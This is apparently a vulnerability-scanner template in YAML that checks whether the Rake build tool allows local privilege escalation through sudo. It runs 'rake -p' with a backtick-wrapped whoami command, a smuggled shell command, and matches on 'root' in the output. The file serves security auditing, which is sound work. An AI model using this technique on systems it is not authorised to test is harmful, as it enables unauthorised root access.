code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'rake -p ''`whoami 1>&0`''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo rake -p ''`whoami 1>&0`''

    '
id: privesc-rake
info:
  author: daffainfo
  description: 'Rake is a build automation tool written in Ruby. It is similar to
    Make, Ant, or MSBuild, but uses a Ruby syntax. Rake is often used for automating
    tasks in software development, such as building, testing, and deploying applications.

    '
  metadata:
    max-request: 3
    verified: true
  name: Rake - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/rake/
  severity: high
  tags: code,linux,rake,privesc,local
self-contained: true
